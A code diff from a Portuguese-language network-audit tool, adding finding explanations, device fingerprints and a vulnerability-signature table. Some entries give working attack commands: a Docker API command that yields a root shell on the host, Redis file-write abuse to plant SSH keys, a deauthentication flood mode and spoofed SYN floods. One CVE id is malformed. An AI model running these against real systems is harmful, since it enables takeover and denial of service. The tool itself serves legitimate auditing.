+            "Versões antigas (SMB1) têm falhas críticas como EternalBlue (WannaCry)."),
+        "como_validar": (
+            "No Windows: `nmap -p445 --script smb-protocols IP` mostra dialeto. "
+            "Se SMB1 ativo, é EternalBlue (CVE-2017-0144). "
+            "Em Linux: `smbclient -L //IP` lista compartilhamentos."),
+        "impacto": (
+            "EternalBlue/SMBGhost permitem RCE remoto sem credenciais — usado "
+            "por ransomware (WannaCry, NotPetya) que destruiu hospitais e "
+            "fábricas. Exposto em rede WiFi pública é fim de jogo."),
+    },
+    "porta_rdp": {
+        "titulo": "RDP exposto (porta 3389)",
+        "resumo": (
+            "Remote Desktop Protocol: controle gráfico remoto de Windows. "
+            "Alvo número 1 de ransomware desde 2018."),
+        "como_validar": (
+            "Conecte via cliente RDP (mstsc no Windows, Remmina no Linux). "
+            "Se mostra tela de login, está aberto. Verifique se NLA (Network "
+            "Level Authentication) está obrigatório."),
+        "impacto": (
+            "BlueKeep (CVE-2019-0708) permite RCE pré-autenticação. "
+            "Exposição na internet ou WiFi convidado leva a brute-force "
+            "automatizado e infecção por ransomware. NUNCA deve estar exposto."),
+    },
+    "porta_rtsp": {
+        "titulo": "RTSP exposto (porta 554)",
+        "resumo": (
+            "Real-Time Streaming Protocol: usado por câmeras IP para "
+            "transmitir vídeo. Frequentemente sem autenticação adequada."),
+        "como_validar": (
+            "Use VLC Media Player → Mídia → Abrir Fluxo de Rede → "
+            "`rtsp://IP/live`. Se o vídeo aparecer, qualquer um na rede "
+            "está vendo o feed da câmera."),
+        "impacto": (
+            "Acesso ao stream de câmeras de segurança/babá/empresas. "
+            "Bancos de dados públicos (Insecam) listam câmeras expostas em "
+            "tempo real. Violação de privacidade óbvia."),
+    },
+    "porta_snmp": {
+        "titulo": "SNMP exposto (porta 161)",
+        "resumo": (
+            "Simple Network Management Protocol: protocolo de gerência usado "
+            "por switches, roteadores e impressoras. Frequentemente com "
+            "community 'public' (read) ou 'private' (read+write) padrão."),
+        "como_validar": (
+            "`snmpwalk -v1 -c public IP` lista informações do dispositivo. "
+            "Se retornar dados, community está aceita. Tente também `private`."),
+        "impacto": (
+            "Com 'public' o atacante mapeia tudo (interfaces, processos, "
+            "tabelas de roteamento). Com 'private' pode RECONFIGURAR o "
+            "dispositivo (mudar rotas, derrubar interfaces, criar usuários). "
+            "Também é usado em ataques de amplificação DDoS (~600x)."),
+    },
+    "porta_dns": {
+        "titulo": "DNS exposto (porta 53)",
+        "resumo": (
+            "Servidor DNS aberto. Se for recursivo (responde queries para "
+            "domínios externos), pode ser abusado em ataques de amplificação."),
+        "como_validar": (
+            "`dig @IP google.com` — se responder com IP do Google, é recursivo "
+            "aberto. `dig @IP version.bind chaos txt` retorna versão do BIND."),
+        "impacto": (
+            "Resolvers abertos são usados em ataques DDoS de amplificação "
+            "(query pequena → resposta grande, refletida na vítima). "
+            "Coloca o ISP do dono na lista negra. Atacantes também enxergam "
+            "padrões de navegação interna."),
+    },
+    "porta_ntp": {
+        "titulo": "NTP exposto (porta 123)",
+        "resumo": (
+            "Network Time Protocol: sincroniza relógios. Versões antigas "
+            "respondem ao comando `monlist` que retorna até 600 IPs por query."),
+        "como_validar": (
+            "`ntpdc -n -c monlist IP` ou `nmap -sU -pU:123 --script ntp-monlist IP`. "
+            "Se retornar lista de hosts, está vulnerável a amplificação."),
+        "impacto": (
+            "Amplificação NTP foi usada em DDoS de 400 Gbps (Cloudflare 2014). "
+            "Servidor vira arma contra terceiros. Atualizar para ntpd ≥ 4.2.7p26 "
+            "ou desabilitar monlist resolve."),
+    },
+    "porta_redis": {
+        "titulo": "Redis exposto (porta 6379)",
+        "resumo": (
+            "Banco de dados em memória. Por padrão, vem SEM autenticação."),
+        "como_validar": (
+            "`redis-cli -h IP -p 6379` → comando `INFO` lista versão e dados. "
+            "Se conectar sem senha, está aberto."),
+        "impacto": (
+            "Sem auth, atacante lê/escreve TUDO. Pior: comando `CONFIG SET` "
+            "permite gravar arquivo arbitrário no disco — usado para escrever "
+            "chave SSH em /root/.ssh/authorized_keys e ganhar shell remoto."),
+    },
+    "porta_mongo": {
+        "titulo": "MongoDB exposto (porta 27017)",
+        "resumo": (
+            "Banco NoSQL. Versões < 3.6 vinham sem autenticação por padrão. "
+            "Causa anual de vazamentos massivos de dados."),
+        "como_validar": (
+            "`mongo --host IP --port 27017` → comando `show dbs`. Se listar "
+            "bancos, está sem auth. Acesso aos dados é trivial."),
+        "impacto": (
+            "Vazamentos de centenas de milhões de registros já aconteceram "
+            "(MyHeritage 92M, MongoDB ransom 2017). Atacante lê, copia "
+            "e/ou apaga e exige resgate em Bitcoin."),
+    },
+    "porta_elastic": {
+        "titulo": "Elasticsearch exposto (porta 9200)",
+        "resumo": (
+            "Mecanismo de busca/log analítico. Histórico ruim de exposição "
+            "pública sem auth (X-Pack era pago até 2018)."),
+        "como_validar": (
+            "`curl http://IP:9200/_cat/indices` lista todos os índices. "
+            "Se responder, está sem auth."),
+        "impacto": (
+            "Vazamento de logs de aplicação, dados de clientes, métricas "
+            "internas. Atacante pode também apagar todos os índices."),
+    },
+    "porta_docker": {
+        "titulo": "Docker API exposta (porta 2375)",
+        "resumo": (
+            "API de gerência do Docker SEM TLS. Permite criar/parar/inspecionar "
+            "containers remotamente."),
+        "como_validar": (
+            "`curl http://IP:2375/version` ou `docker -H tcp://IP:2375 ps`. "
+            "Se responder, é jogo perdido."),
+        "impacto": (
+            "RCE trivial: `docker -H tcp://IP:2375 run -v /:/host alpine "
+            "chroot /host` dá shell root no HOST. Equivale a entregar a chave "
+            "do servidor para qualquer um na rede."),
+    },
+    # ── Vazamentos de segredos ────────────────────────────────
+    "secret_leak": {
+        "titulo": "Segredo vazado em arquivo público",
+        "resumo": (
+            "Um arquivo que normalmente fica nos bastidores (.env, .git/config, "
+            "backup.sql, id_rsa, .aws/credentials) está acessível por HTTP — "
+            "e o conteúdo bate com padrões de credenciais reais."),
+        "como_validar": (
+            "Abra a URL no navegador (`http://IP:porta/PATH`). Se retornar o "
+            "conteúdo do arquivo (não erro 404), o vazamento é real. "
+            "Procure por strings como `password=`, `BEGIN PRIVATE KEY`, "
+            "`AWS_SECRET_ACCESS_KEY=AKIA...`."),
+        "impacto": (
+            "Acesso direto a banco de dados, API privada, conta AWS, Git "
+            "interno, etc. Em segundos o atacante tem credenciais válidas "
+            "para se mover lateralmente. Cenário real: GitHub.com já bloqueou "
+            "milhões de tokens AWS vazados."),
+    },
+    "psk_exposto": {
+        "titulo": "Senha WiFi (PSK) exposta em página HTML/JS",
+        "resumo": (
+            "Roteadores antigos (e alguns novos com firmware ruim) renderizam "
+            "a senha WiFi em texto puro dentro do HTML/JavaScript da página "
+            "de status — sem autenticação ou com auth contornável."),
+        "como_validar": (
+            "Abra a URL no navegador, depois Ctrl+U (ver código-fonte). "
+            "Procure por `wifiKey`, `wpaKey`, `pskValue`, `wpaPassphrase`. "
+            "Se a senha aparece, basta copiar."),
+        "impacto": (
+            "Atacante na faixa do WiFi (corredor, vizinho) entra na rede e, "
+            "uma vez dentro, está atrás do firewall. Vê tráfego, ataca "
+            "dispositivos internos, usa a internet do alvo."),
+    },
+    "snmp_community_extra": {
+        "titulo": "SNMP — community não-padrão aceita",
+        "resumo": (
+            "Além do clássico 'public' (somente leitura), o dispositivo "
+            "aceitou outra community (private/cisco/admin/...). 'private' "
+            "tradicionalmente dá permissão de ESCRITA via SNMP."),
+        "como_validar": (
+            "`snmpwalk -v1 -c <community> IP` lista dados. Se retornar, "
+            "tente `snmpset` na mesma community para ver se escreve."),
+        "impacto": (
+            "Com community de escrita, atacante reconfigura o equipamento: "
+            "cria usuários, muda rotas, abre portas, derruba interfaces. "
+            "Em switches gerenciados é jogo perdido — controla a rede inteira."),
+    },
+    "creds_padrao": {
+        "titulo": "Credenciais padrão prováveis (informativo)",
+        "resumo": (
+            "Identificamos o fabricante/modelo do dispositivo via fingerprint "
+            "web ou MAC OUI. Cruzamos com nosso banco de credenciais default "
+            "deste fabricante. NÃO testamos login — é só uma sugestão."),
+        "como_validar": (
+            "Abra o painel de login no navegador e tente os pares listados. "
+            "Confirme com a documentação do modelo. Se funcionou, troque a "
+            "senha IMEDIATAMENTE."),
+        "impacto": (
+            "75% dos dispositivos IoT/roteadores residenciais nunca tiveram "
+            "a senha padrão trocada. Atacante automatizado (Mirai) testa "
+            "essas combinações em segundos. Trocar a senha é o controle "
+            "mais barato e eficaz."),
+    },
+    # ── Amplificação ──────────────────────────────────────────
+    "amplificacao": {
+        "titulo": "Serviço vulnerável a amplificação DDoS",
+        "resumo": (
+            "Serviços UDP (DNS, NTP, SNMP, Memcached, SSDP) permitem que "
+            "uma query pequena gere uma resposta gigante. Atacante envia "
+            "queries com IP de origem falsificado para a vítima, e o "
+            "serviço joga a resposta na vítima."),
+        "como_validar": (
+            "Em redes monitoradas, observe se o tráfego de saída deste IP "
+            "aumenta drasticamente sem motivo aparente. Para teste manual, "
+            "use ferramentas como `mfx` ou `dnsperf` em ambiente isolado."),
+        "impacto": (
+            "Mesmo que o dono não seja o alvo, o servidor vira ARMA. "
+            "ISPs colocam IPs assim em listas negras. Em ataques recordes "
+            "(GitHub 2018, 1.35 Tbps via Memcached) milhares de servidores "
+            "abertos foram usados como amplificadores."),
+    },
+    # ── Paths e exposições web ────────────────────────────────
+    "path_default": {
+        "titulo": "Painel administrativo / path default acessível",
+        "resumo": (
+            "Caminhos como /phpmyadmin, /wp-admin, /manager/html ou "
+            "/server-status estão acessíveis via HTTP — alvos clássicos "
+            "de força-bruta e exploits específicos."),
+        "como_validar": (
+            "Abra a URL e veja se aparece tela de login ou status do servidor. "
+            "Se sim, o painel está exposto. Verifique se exige autenticação "
+            "forte e se está atrás de VPN/whitelist."),
+        "impacto": (
+            "Painéis expostos sofrem brute-force 24/7 por bots automatizados. "
+            "Combinado com creds default, é arrombamento. /server-status "
+            "do Apache vaza requisições em andamento (incluindo URLs com "
+            "tokens em GET)."),
+    },
+    "headers_seguranca": {
+        "titulo": "Headers de segurança HTTP ausentes",
+        "resumo": (
+            "Headers como X-Frame-Options, Content-Security-Policy e HSTS "
+            "instruem o navegador a aplicar proteções (bloquear iframe, "
+            "limitar scripts, forçar HTTPS). Ausência facilita XSS, "
+            "clickjacking e downgrade attacks."),
+        "como_validar": (
+            "`curl -I https://IP:porta` mostra os headers. Cruze com "
+            "https://securityheaders.com (avalia gratuitamente)."),
+        "impacto": (
+            "Sozinho não é exploit — é falta de defesa em profundidade. "
+            "Combinado com XSS no app, vira sequestro de sessão. "
+            "Combinado com phishing, vira clickjacking."),
+    },
+    "ssh_versao_antiga": {
+        "titulo": "OpenSSH versão antiga",
+        "resumo": (
+            "Servidor SSH com versão antiga, sujeita a CVEs conhecidas como "
+            "user enumeration (CVE-2018-15473, OpenSSH < 7.7)."),
+        "como_validar": (
+            "`ssh -V` no servidor mostra versão. `ssh user@IP` no cliente "
+            "mostra banner. Cruze com NIST NVD pelo CVE listado."),
+        "impacto": (
+            "User enumeration permite descobrir nomes válidos, viabilizando "
+            "brute-force direcionado. Versões muito antigas têm falhas mais "
+            "graves (RCE pré-auth em SSH < 4.x)."),
+    },
+    # ── Honeypot (futura) ─────────────────────────────────────
+    "honeypot": {
+        "titulo": "Possível honeypot detectado",
+        "resumo": (
+            "Honeypot é um dispositivo armadilha: simula vulnerabilidades "
+            "para atrair atacantes e estudar comportamento. Indicadores: "
+            "muitas portas abertas em sequência, banners idênticos, "
+            "respostas absurdamente rápidas (<1ms), TTL inconsistente."),
+        "como_validar": (
+            "Compare a latência de portas vs ping ICMP. Verifique se "
+            "banners distintos respondem com texto idêntico. Procure "
+            "padrões irreais (todas as 65535 portas abertas)."),
+        "impacto": (
+            "Continuar atacando um honeypot expõe TÁTICAS e ferramentas do "
+            "atacante para o defensor. Em pentest legítimo, evita perder "
+            "tempo investigando rede falsa."),
+    },
+    # ── Stress / Resiliência ──────────────────────────────────
+    "godfall_resultado": {
+        "titulo": "Godfall — Benchmark de resiliência",
+        "resumo": (
+            "Teste de stress controlado em 4 fases (VANGUARD → SIEGE → "
+            "OVERDRIVE → TITANFALL) que mede como cada host se comporta "
+            "sob carga crescente: TCP connects, HTTP bursts e barragem "
+            "UDP multi-thread em paralelo."),
+        "como_validar": (
+            "Reproduza a tabela de fases: cada uma aumenta o multiplier e "
+            "concorrência. Compare a taxa de sucesso (%) e a latência de "
+            "ping ao gateway durante o teste. Hosts que caem para <20% "
+            "de sucesso na fase OVERDRIVE são frágeis."),
+        "impacto": (
+            "Mostra a capacidade real da rede sob ataque ou tráfego de pico. "
+            "Identifica dispositivos que travam fácil (IoT antigo, "
+            "roteadores residenciais) e que precisam ser substituídos ou "
+            "isolados antes de eventos de carga (live, festa, Black Friday)."),
+    },
+    # ── Modo Root e técnicas privilegiadas ────────────────────
+    "privilegio_root": {
+        "titulo": "Modo Root (--root) — Auditoria Apex",
+        "resumo": (
+            "Quando ativo, troca técnicas user-space por raw sockets, scapy, "
+            "binários nativos privilegiados (aireplay-ng, mdk4, tcpdump, "
+            "nmap como root) e telemetria de kernel. Detecta SO automaticamente: "
+            "Windows Admin → motor 'adm'; Linux como root → 'root-kali'; "
+            "Termux com su → 'root-termux'."),
+        "como_validar": (
+            "Cheque o banner 'PRIVILEGE MODE ATIVADO' no boot — ele lista o motor "
+            "detectado e as capabilities disponíveis. Em Linux: `id` deve retornar "
+            "uid=0. Em Windows: PowerShell/cmd como Admin. Sem privilégio, --root "
+            "recusa explicitamente com instruções."),
+        "impacto": (
+            "ARP active sweep ~10x mais rápido que ping; SYN scan stealth não "
+            "loga em syslog do alvo; SNMP testa wordlist 40+; godfall com "
+            "concorrência 1024 e SYN flood spoofed via scapy. Capacidade total "
+            "do tooling fica ~3-5x maior — comparável a Kali/nmap em modo SYN."),
+    },
+    "arp_spoofing_detect": {
+        "titulo": "ARP Spoofing detectado (passivo)",
+        "resumo": (
+            "Durante 10s, capturamos pacotes ARP via tcpdump. Se o mesmo IP "
+            "responde com MACs DIFERENTES em um curto intervalo, alguém está "
+            "fazendo gratuitous ARP — clássico man-in-the-middle (MITM) na LAN."),
+        "como_validar": (
+            "Em outra shell: `tcpdump -i any -n arp` por 30s. Cruze o IP "
+            "suspeito com a tabela ARP do roteador (`arp -a` no roteador). "
+            "Se o MAC do roteador estiver associado a outro IP de cliente, "
+            "MITM confirmado."),
+        "impacto": (
+            "Atacante intercepta TODO o tráfego entre vítima e gateway. Pode "
+            "ler senhas em texto puro, fazer SSL strip, injetar conteúdo. "
+            "Ferramentas: ettercap, bettercap. Mitigação: ARP estático no "
+            "switch/AP (Dynamic ARP Inspection)."),
+    },
+    "lldp_cdp": {
+        "titulo": "LLDP/CDP exposto",
+        "resumo": (
+            "Link Layer Discovery Protocol (LLDP) e Cisco Discovery Protocol "
+            "(CDP) são frames multicast que switches/routers enviam regularmente "
+            "expondo modelo, versão de firmware, porta física, VLAN, capabilities."),
+        "como_validar": (
+            "`tcpdump -i any -nn -e ether host 01:80:c2:00:00:0e or ether "
+            "host 01:00:0c:cc:cc:cc -c 5` em rede com switch gerenciado mostra "
+            "frames LLDP. Wireshark dissecca melhor (filtro `lldp || cdp`)."),
+        "impacto": (
+            "Atacante mapeia toda topologia interna sem nenhum scan. Vê switch "
+            "stack, VLANs disponíveis, portas físicas — base para VLAN hopping, "
+            "STP attack, ataques direcionados. Solução: desabilitar LLDP/CDP "
+            "em portas de acesso (manter só em uplinks entre switches)."),
+    },
+    "dns_snooping": {
+        "titulo": "DNS Cache Snooping",
+        "resumo": (
+            "Enviamos queries com flag RD=0 (não-recursivo) para domínios "
+            "populares (google.com, facebook.com). Se o servidor responde com "
+            "ANCOUNT>0, é porque tem o domínio em cache — alguém daquela rede "
+            "acessou recentemente."),
+        "como_validar": (
+            "`dig @IP google.com +norecurse` — se retornar IP, está cacheado. "
+            "Repita para vários domínios e cruze. Se um padrão aparece "
+            "(somente sites de banco X), você infere que o usuário é cliente "
+            "daquele banco."),
+        "impacto": (
+            "Vazamento passivo de hábitos de navegação dos usuários da rede. "
+            "Pode ser usado para profiling em ataques direcionados (spear "
+            "phishing). Solução: desabilitar resolver recursivo público ou "
+            "exigir autenticação."),
+    },
+    "kamikase": {
+        "titulo": "Kamikase — Deauth Flood 802.11",
+        "resumo": (
+            "Stress 802.11 que envia frames Management de Deauthentication "
+            "para todos os APs visíveis em loop infinito até Ctrl+C. Frame "
+            "com src=BSSID e dst=ff:ff:ff:ff:ff:ff força TODOS os clientes "
+            "associados a se reconectarem. Em alta taxa, derruba a rede."),
+        "como_validar": (
+            "Em outra máquina, observe o WiFi: clientes desconectam "
+            "constantemente, ícone fica 'reconectando'. Em Wireshark "
+            "(monitor mode em outra placa), filtro `wlan.fc.type_subtype "
+            "== 0x0c` mostra deauth frames. Confira `kamikase_audit.log`."),
+        "impacto": (
+            "Para teste autorizado: mostra resiliência da rede, identifica "
+            "se há rogue AP detection, força clientes a re-handshake (útil "
+            "para captura WPA). Sem autorização: CRIME (Lei 12.737/2012 BR; "
+            "CFAA EUA). Defesa: 802.11w (Management Frame Protection)."),
+    },
+}
+# Assinaturas para classificação por title/server/body em respostas HTTP
+DEVICE_FINGERPRINTS = [
+    # Roteadores domésticos
+    {"vendor": "TP-Link",      "marker": "tp-link",      "tipo": "roteador"},
+    {"vendor": "TP-Link",      "marker": "tplinkwifi",   "tipo": "roteador"},
+    {"vendor": "ASUS",         "marker": "asuswrt",      "tipo": "roteador"},
+    {"vendor": "ASUS",         "marker": "rt-ax",        "tipo": "roteador"},
+    {"vendor": "D-Link",       "marker": "d-link",       "tipo": "roteador"},
+    {"vendor": "Linksys",      "marker": "linksys",      "tipo": "roteador"},
+    {"vendor": "Netgear",      "marker": "netgear",      "tipo": "roteador"},
+    {"vendor": "Tenda",        "marker": "tenda",        "tipo": "roteador"},
+    {"vendor": "Xiaomi",       "marker": "miwifi",       "tipo": "roteador"},
+    {"vendor": "Xiaomi",       "marker": "xiaomi",       "tipo": "roteador"},
+    {"vendor": "ZTE",          "marker": "zte",          "tipo": "roteador"},
+    {"vendor": "Huawei",       "marker": "huawei",       "tipo": "roteador"},
+    {"vendor": "Intelbras",    "marker": "intelbras",    "tipo": "roteador"},
+    {"vendor": "MikroTik",     "marker": "routeros",     "tipo": "roteador"},
+    {"vendor": "MikroTik",     "marker": "mikrotik",     "tipo": "roteador"},
+    {"vendor": "Ubiquiti",     "marker": "edgeos",       "tipo": "roteador"},
+    {"vendor": "Ubiquiti",     "marker": "unifi",        "tipo": "roteador"},
+    {"vendor": "Ubiquiti",     "marker": "airos",        "tipo": "roteador"},
+    {"vendor": "Cisco",        "marker": "cisco",        "tipo": "roteador"},
+    {"vendor": "Aruba",        "marker": "aruba",        "tipo": "roteador"},
+    {"vendor": "Ruckus",       "marker": "ruckus",       "tipo": "roteador"},
+    {"vendor": "pfSense",      "marker": "pfsense",      "tipo": "roteador"},
+    {"vendor": "OpenWrt",      "marker": "openwrt",      "tipo": "roteador"},
+    # Câmeras IP / NVRs
+    {"vendor": "Hikvision",    "marker": "hikvision",    "tipo": "camera_ip"},
+    {"vendor": "Hikvision",    "marker": "ds-",          "tipo": "camera_ip"},
+    {"vendor": "Dahua",        "marker": "dahua",        "tipo": "camera_ip"},
+    {"vendor": "Dahua",        "marker": "webservice",   "tipo": "camera_ip"},
+    {"vendor": "Axis",         "marker": "axis",         "tipo": "camera_ip"},
+    {"vendor": "Foscam",       "marker": "foscam",       "tipo": "camera_ip"},
+    {"vendor": "Amcrest",      "marker": "amcrest",      "tipo": "camera_ip"},
+    {"vendor": "Reolink",      "marker": "reolink",      "tipo": "camera_ip"},
+    {"vendor": "Wyze",         "marker": "wyze",         "tipo": "camera_ip"},
+    {"vendor": "Tuya",         "marker": "tuya",         "tipo": "iot_generico"},
+    {"vendor": "Genérico",     "marker": "ipcamera",     "tipo": "camera_ip"},
+    # NAS
+    {"vendor": "Synology",     "marker": "synology",     "tipo": "nas"},
+    {"vendor": "Synology",     "marker": "diskstation",  "tipo": "nas"},
+    {"vendor": "QNAP",         "marker": "qnap",         "tipo": "nas"},
+    {"vendor": "QNAP",         "marker": "qts",          "tipo": "nas"},
+    {"vendor": "TrueNAS",      "marker": "truenas",      "tipo": "nas"},
+    {"vendor": "TrueNAS",      "marker": "freenas",      "tipo": "nas"},
+    # Impressoras
+    {"vendor": "HP",           "marker": "hp laserjet",  "tipo": "impressora"},
+    {"vendor": "HP",           "marker": "hp officejet", "tipo": "impressora"},
+    {"vendor": "Epson",        "marker": "epson",        "tipo": "impressora"},
+    {"vendor": "Brother",      "marker": "brother",      "tipo": "impressora"},
+    {"vendor": "Canon",        "marker": "canon",        "tipo": "impressora"},
+    # VoIP
+    {"vendor": "Grandstream",  "marker": "grandstream",  "tipo": "voip"},
+    # Servidores web comuns
+    {"vendor": "Apache",       "marker": "apache",       "tipo": "linux_servidor"},
+    {"vendor": "nginx",        "marker": "nginx",        "tipo": "linux_servidor"},
+    {"vendor": "lighttpd",     "marker": "lighttpd",     "tipo": "linux_servidor"},
+    {"vendor": "IIS",          "marker": "iis",          "tipo": "windows_pc"},
+    {"vendor": "GoAhead",      "marker": "goahead",      "tipo": "iot_generico"},
+    {"vendor": "Boa",          "marker": "boa/",         "tipo": "iot_generico"},
+    {"vendor": "Mongoose",     "marker": "mongoose",     "tipo": "iot_generico"},
+]
+
+# ──────────── Banco de Vulnerabilidades (passivo) ────────────
+# Para cada porta: lista de assinaturas {servico, regex_banner, dica_cve, severidade}.
+# Severidades: critica, alta, media, info. Tudo heurístico — sem exploit.
+VULN_DB: Dict[int, List[Dict[str, Any]]] = {
+    21: [
+        {"servico": "ftp", "regex": r"ProFTPD\s*1\.3\.3c",
+         "dica": "ProFTPD 1.3.3c — backdoor (CVE-2010-15)", "severidade": "critica"},
+        {"servico": "ftp", "regex": r"vsftpd\s*2\.3\.4",
+         "dica": "vsftpd 2.3.4 — backdoor smiley (CVE-2011-2523)", "severidade": "critica"},
+        {"servico": "ftp", "regex": r"(?i)anonymous",
+         "dica": "FTP anônimo possivelmente habilitado", "severidade": "media"},
+        {"servico": "ftp", "regex": r".*",
+         "dica": "FTP em texto puro — credenciais expostas em sniffing", "severidade": "media"},
+    ],
+    22: [
+        {"servico": "ssh", "regex": r"OpenSSH_([0-6]\.|7\.[0-6])",
+         "dica": "OpenSSH < 7.7 — user enumeration (CVE-2018-15473)", "severidade": "alta"},
+        {"servico": "ssh", "regex": r"OpenSSH_5\.",
+         "dica": "OpenSSH 5.x — múltiplos CVEs, fim de suporte", "severidade": "alta"},
+        {"servico": "ssh", "regex": r"dropbear",
+         "dica": "Dropbear comum em IoT — verificar versão e creds default", "severidade": "info"},
+    ],
+    23: [
+        {"servico": "telnet", "regex": r".*",
+         "dica": "Telnet em texto puro — alvo clássico Mirai", "severidade": "alta"},
+    ],
+    25: [
+        {"servico": "smtp", "regex": r"(?i)open relay|relay=ok",
+         "dica": "SMTP open relay — possível abuso para spam", "severidade": "alta"},
+        {"servico": "smtp", "regex": r".*",
+         "dica": "SMTP exposto — verificar STARTTLS e autenticação", "severidade": "info"},
+    ],
+    53: [
+        {"servico": "dns", "regex": r".*",
+         "dica": "DNS exposto — verificar recursão aberta (amplificação)", "severidade": "media"},
+    ],
+    80: [
+        {"servico": "http", "regex": r"Apache/(1\.|2\.0|2\.2)",
+         "dica": "Apache antigo — múltiplos CVEs históricos", "severidade": "alta"},
+        {"servico": "http", "regex": r"nginx/0\.|nginx/1\.[0-9]\b",
+         "dica": "nginx < 1.10 — possíveis CVEs", "severidade": "media"},
+        {"servico": "http", "regex": r"Microsoft-IIS/[5-7]",
+         "dica": "IIS legado (≤7.x) — CVEs conhecidos", "severidade": "alta"},
+    ],
+    111: [
+        {"servico": "rpcbind", "regex": r".*",
+         "dica": "rpcbind exposto — usado em ataques de amplificação", "severidade": "alta"},
+    ],
+    123: [
+        {"servico": "ntp", "regex": r".*",
+         "dica": "NTP exposto — verificar monlist (amplificação)", "severidade": "media"},
+    ],
+    139: [
+        {"servico": "netbios", "regex": r".*",
+         "dica": "NetBIOS exposto — alvo SMBv1 / null session", "severidade": "alta"},
+    ],
+    161: [
+        {"servico": "snmp", "regex": r".*",
+         "dica": "SNMP exposto — verificar community public/private", "severidade": "alta"},
+    ],
+    443: [
+        {"servico": "https", "regex": r"OpenSSL/1\.0\.1",
+         "dica": "OpenSSL 1.0.1 — Heartbleed (CVE-2014-0160)", "severidade": "critica"},
+        {"servico": "https", "regex": r"Apache/(1\.|2\.0|2\.2)",
+         "dica": "Apache antigo (HTTPS) — auditoria de versão", "severidade": "alta"},
+    ],
+    445: [
+        {"servico": "smb", "regex": r".*",
+         "dica": "SMB exposto — CVE-2017-0144 EternalBlue / CVE-2020-0796 SMBGhost",
+         "severidade": "critica"},
+    ],
+    554: [
+        {"servico": "rtsp", "regex": r".*",
+         "dica": "RTSP exposto — checar autenticação na URL", "severidade": "media"},
+    ],
+    1433: [
+        {"servico": "mssql", "regex": r".*",
+         "dica": "MSSQL exposto — sa fraco / CVE-2020-0618", "severidade": "alta"},
+    ],
+    1900: [
+        {"servico": "upnp", "regex": r".*",
+         "dica": "UPnP/SSDP exposto — amplificação e CallStranger (CVE-2020-12695)",
+         "severidade": "alta"},
+    ],
+    2049: [
+        {"servico": "nfs", "regex": r".*",
+         "dica": "NFS exposto — verificar exports anônimos", "severidade": "alta"},
+    ],
+    2375: [
+        {"servico": "docker", "regex": r".*",
+         "dica": "Docker API sem TLS — RCE trivial se exposto", "severidade": "critica"},
+    ],
+    3306: [
+        {"servico": "mysql", "regex": r".*",
+         "dica": "MySQL exposto — root sem senha é comum em IoT/dev", "severidade": "alta"},
+    ],
+    3389: [
+        {"servico": "rdp", "regex": r".*",
+         "dica": "RDP exposto — BlueKeep (CVE-2019-0708)", "severidade": "critica"},
+    ],
+    5432: [
+        {"servico": "postgres", "regex": r".*",
+         "dica": "PostgreSQL exposto — verificar pg_hba", "severidade": "alta"},
+    ],
+    5900: [
+        {"servico": "vnc", "regex": r".*",
+         "dica": "VNC exposto — comum sem senha em LAN", "severidade": "alta"},
+    ],
+    6379: [
+        {"servico": "redis", "regex": r".*",
+         "dica": "Redis exposto sem auth — RCE via CONFIG SET", "severidade": "critica"},
+    ],
+    7547: [
+        {"servico": "tr-069", "regex": r".*",
+         "dica": "TR-069 exposto — Mirai variants (CVE-2016-10372)", "severidade": "alta"},
+    ],
+    8080: [
+        {"servico": "http-proxy", "regex": r"(?i)tomcat",
+         "dica": "Tomcat exposto — manager/html com creds default", "severidade": "alta"},
+    ],
+    9200: [
+        {"servico": "elasticsearch", "regex": r".*",
+         "dica": "Elasticsearch sem auth — vazamento de dados", "severidade": "critica"},
+    ],
+    11211: [
+        {"servico": "memcached", "regex": r".*",
+         "dica": "Memcached exposto — amplificação UDP massiva", "severidade": "alta"},
+    ],
+    27017: [
+        {"servico": "mongodb", "regex": r".*",
+         "dica": "MongoDB sem auth — vazamento de dados", "severidade": "critica"},
+    ],
+    37777: [
+        {"servico": "dahua", "regex": r".*",
+         "dica": "Dahua DVR — CVE-2021-33044 / 33045 bypass", "severidade": "critica"},
+    ],
+}
+
+# ──────────── Heurísticas de classificação de dispositivo ─────
+# Avaliadas em ordem; primeiro match define o tipo. Use chaves PT-BR.
+DEVICE_HEURISTICS = [
+    {"tipo": "roteador",        "is_gateway": True},
+    {"tipo": "camera_ip",       "vendor_in": ["Hikvision", "Dahua", "Axis", "Foscam",
+                                                "Amcrest", "Reolink", "Wyze", "Tuya"]},
+    {"tipo": "camera_ip",       "porta_qualquer": [554, 8554, 37777, 34567]},
+    {"tipo": "impressora",      "vendor_in": ["HP", "Epson", "Brother", "Canon",
+                                                "Samsung-Printer", "Kyocera"]},
+    {"tipo": "impressora",      "porta_qualquer": [9100, 631, 515]},
+    {"tipo": "nas",             "vendor_in": ["Synology", "QNAP"]},
+    {"tipo": "nas",             "porta_qualquer": [548, 5000, 5001, 8080]},
+    {"tipo": "voip",            "vendor_in": ["Grandstream"]},
+    {"tipo": "voip",            "porta_qualquer": [5060, 5061]},
+    {"tipo": "windows_pc",      "porta_qualquer": [445, 139, 3389, 135]},
+    {"tipo": "windows_pc",      "ttl_em": ["Windows"]},
+    {"tipo": "linux_servidor",  "porta_qualquer": [22, 2049, 5432, 27017, 6379]},
+    {"tipo": "linux_servidor",  "ttl_em": ["Linux"]},
+    {"tipo": "mobile",          "ttl_em": ["iOS"]},
+    {"tipo": "mobile",          "vendor_in": ["Apple", "Samsung", "Xiaomi", "Huawei",
+                                                "LG", "Sony"]},
+    {"tipo": "iot_generico",    "vendor_in": ["Tuya", "Wyze", "Eufy", "Sonos", "Roku",
+                                                "Amazon", "Google-Nest"]},
+]
 
 # ════════════════════ BANNER ASCII ════════════════════════════
 BANNER = r"""
@@ -222,6 +1268,200 @@ BANNER = r"""
 [dim #555555]          ⟨ Professional Network Analysis Toolkit ⟩[/dim #555555]
 [dim #555555]              v{version} · No Root · Termux Ready[/dim #555555]
 """
+
+# ══════════════════ CONTEXTO DE PRIVILÉGIO ════════════════════
+# Detecta SO + valida privilégio (admin/root/su) e expõe capabilities.
+# Uma única flag `--root` aciona o motor correto por SO.
+
+class ContextoPrivilegio:
+    """Centraliza detecção de plataforma e privilégio.
+
+    plataforma : "windows" | "linux" | "termux"
+    motor      : "adm" | "root-kali" | "root-termux"
+    ativo      : True se --root foi passado e privilégio confirmado
+    capabilities : conjunto de strings com recursos disponíveis
+    """
+
+    def __init__(self):
+        self.plataforma: str = ""
+        self.motor: str = ""
+        self.ativo: bool = False
+        self.capabilities: Set[str] = set()
+        self.detalhes: Dict[str, Any] = {}
+
+    @classmethod
+    def detectar_plataforma(cls) -> str:
